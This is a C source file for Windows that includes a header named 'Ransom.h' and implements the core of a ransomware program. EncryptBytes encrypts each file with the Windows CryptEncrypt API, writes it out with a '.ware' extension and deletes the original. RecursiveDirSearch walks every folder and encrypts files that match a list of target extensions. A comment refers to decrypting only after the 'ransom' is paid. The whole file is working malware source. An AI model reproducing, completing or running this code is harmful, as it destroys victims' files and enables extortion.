#pragma once
#include "Ransom.h"

void EncryptBytes(WCHAR filePath[], HKEY hKey) {
	//handle from findfirstfile is not readable by readfile, have to open file using createfile first
	HANDLE currentFile;
	currentFile = CreateFile(filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (currentFile == INVALID_HANDLE_VALUE) {
		return;
	}

	//setup to append .ware to file path
	WCHAR encryptedFilePath[MAX_PATH * sizeof(WCHAR)] = { 0 };
	wcscpy(encryptedFilePath, filePath);
	AppendNewFileExtension(encryptedFilePath);

	//create encrypted file, which is just the original file path with .ware appended to the end
	HANDLE encryptedFile;
	encryptedFile = CreateFile(encryptedFilePath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (encryptedFile == INVALID_HANDLE_VALUE) {
		return;
	}

	DWORD bytesToRead = 16;
	DWORD bytesRead = 0;

	DWORD bytesToWrite = 16;
	DWORD bytesWritten = 0;

	DWORD dwBlockLength = 256;
	DWORD dwBufferLength = dwBlockLength;
	DWORD count;

	BYTE* pbBuffer = (BYTE*)malloc(dwBufferLength);
	bool endOfFile = false;

	do {
		ReadFile(currentFile,
			pbBuffer,
			dwBlockLength,
			&count,
			NULL);

		if (count < dwBlockLength) {
			endOfFile = true;
		}

		if (!CryptEncrypt(hKey,
			NULL,
			endOfFile,
			0,
			pbBuffer,
			&count,
			dwBufferLength
		)) {
		}
		WriteFile(encryptedFile, pbBuffer, count, &count, NULL);
	} while (!endOfFile);

	//clean up
	free(pbBuffer);
	CloseHandle(currentFile);
	CloseHandle(encryptedFile);

	//delete original file so only encrypted file remains
	if (!DeleteFile(filePath)) {
		return;
	}
}

void DecryptBytes(WCHAR filePath[], HKEY hKey) { //Basically exactly the same as EncryptBytes but it decrypts it instead
	HANDLE encryptedFile;
	encryptedFile = CreateFile(filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (encryptedFile == INVALID_HANDLE_VALUE) {
		return;
	}

	HANDLE decryptedFile;
	WCHAR decryptedFilePath[MAX_PATH * sizeof(WCHAR)] = { 0 };
	wcscpy(decryptedFilePath, RemoveFileExtension(filePath));

	decryptedFile = CreateFile(decryptedFilePath,
		GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (decryptedFile == INVALID_HANDLE_VALUE) {
		return;
	}

	DWORD bytesToRead = 16;
	DWORD bytesRead = 0;

	DWORD bytesToWrite = 16;
	DWORD bytesWritten = 0;

	DWORD dwBlockLength = 256;
	DWORD dwBufferLength = dwBlockLength;
	DWORD count;

	BYTE* pbBuffer = (BYTE*)malloc(dwBufferLength);
	bool endOfFile = false;

	do {
		ReadFile(encryptedFile,
			pbBuffer,
			dwBlockLength,
			&count,
			NULL);

		if (count < dwBlockLength) {
			endOfFile = true;
		}

		if (!CryptDecrypt(hKey,
			0,
			endOfFile,
			0,
			pbBuffer,
			&count)) {
		}
		WriteFile(decryptedFile, pbBuffer, count, &count, NULL);
	} while (!endOfFile);

	free(pbBuffer);
	CloseHandle(encryptedFile);
	CloseHandle(decryptedFile);

	if (!DeleteFile(filePath)) {
		return;
	}
}

WCHAR* RecursiveDirSearch(WCHAR folderName[], WCHAR listOfFileExtensions[], HKEY hKey, bool decrypt) {
	WCHAR folderNameWildcard[MAX_PATH * sizeof(WCHAR)]; //create copy of file path but with a wildcard appended to the end
	wcscpy(folderNameWildcard, folderName);
	AppendWildcard(folderNameWildcard);

	WIN32_FIND_DATA data;
	HANDLE hFile = FindFirstFileW(folderNameWildcard, &data);

	if (hFile != INVALID_HANDLE_VALUE) {
		do {
			if (data.cFileName[0] != '.') { //every directory has '.' and '..' representing current and parent directory - want to skip these
				//append "\\" and the first file name found to a WCHAR array to search it
				WCHAR path[MAX_PATH * sizeof(WCHAR)];
				wcscpy(path, folderName);
				wcscat(path, L"\\");
				wcscat(path, data.cFileName);

				//if the file is a directory, call method again until a non-directory is found
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					RecursiveDirSearch(path, listOfFileExtensions, hKey, decrypt);
				}

				//once "ransom" is paid, if file with a .ware extension is found, decrypt it
				else if (decrypt && MatchesFileExtension(GetFileExtension(path), L".ware")) {
					//decrypt files here
					DecryptBytes(path, hKey);
				}

				//if file extension matches one in the list, encrypt that file
				else if (!decrypt && MatchesFileExtension(GetFileExtension(path), listOfFileExtensions)) {
					//encrypt file here
					EncryptBytes(path, hKey);
				}
			}
		} while (FindNextFileW(hFile, &data));
	}
	//clean up
	FindClose(hFile);
}